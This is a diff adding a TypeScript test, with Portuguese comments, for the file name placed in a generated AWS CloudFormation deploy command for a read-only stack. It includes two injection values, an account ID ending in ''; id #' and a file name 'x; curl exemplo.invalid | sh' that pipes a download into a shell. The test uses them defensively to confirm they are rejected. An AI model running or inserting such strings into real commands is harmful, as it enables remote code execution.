@@ -16,6 +16,7 @@ import {
   awsKmsKeyPolicyStatement,
   awsLogGroupTagCommand,
   awsReaderPrincipalArn,
+  awsStackFileName,
   awsStackValues,
   capabilitiesOfChoice,
   DOWNLOAD_REVOKE_DELAY_MS,
@@ -133,6 +134,30 @@ describe('escolha das autorizações', () => {
     expect(command).toContain('LogBucketArns=arn:aws:s3:::exemplo-trilha');
     expect(command).toContain('--capabilities CAPABILITY_NAMED_IAM');
     expect(awsConsoleRegion(withBucket)).toBe('us-east-1');
+  });
+
+  it('o comando lê o arquivo que o painel baixa: o preenchido da conta, ou o do repositório na alternativa manual', () => {
+    const choice = { 'service-logs': true, findings: false, 'log-groups': true };
+    const fileOf = (command: string) => command.split(' --template-file ')[1]?.split(' ')[0];
+    // O nome do arquivo preenchido é o que `prefilledReaderTemplate` dá ao arquivo que os botões baixam.
+    const filled = prefilledReaderTemplate(READER_TEMPLATE_TEXT, account(), choice);
+    if (!filled.ok) throw new Error('o template não foi preenchido');
+    expect(awsStackFileName(account())).toBe(filled.fileName);
+    expect(awsStackFileName(account())).toBe('verax-control-reader-111111111111.yaml');
+    // Sem o nome (a alternativa manual), o arquivo do repositório, sem nada preenchido.
+    const plain = awsDeployCommand(account(), choice);
+    expect(fileOf(plain)).toBe('verax-control-reader.yaml');
+    expect(awsDeployCommand(account(), choice, null)).toBe(plain);
+    // Com o nome do arquivo preenchido, só o arquivo muda: os valores e as autorizações continuam no comando.
+    const prefilled = awsDeployCommand(account(), choice, awsStackFileName(account()));
+    expect(fileOf(prefilled)).toBe(filled.fileName);
+    expect(prefilled.split('\n').slice(2)).toEqual(plain.split('\n').slice(2));
+    expect(prefilled).toContain(`NodeServiceAccountId=${NODE_ID}`);
+    expect(prefilled).toContain('ReadSecurityFindings=false');
+    // Um ID de conta fora do formato não dá nome de arquivo (nem arquivo); um nome qualquer não entra no comando.
+    expect(awsStackFileName({ accountId: '1111' })).toBeNull();
+    expect(awsStackFileName({ accountId: "111111111111'; id #" })).toBeNull();
+    expect(awsDeployCommand(account(), choice, 'x; curl exemplo.invalid | sh')).toBe(plain);
   });
 });
 
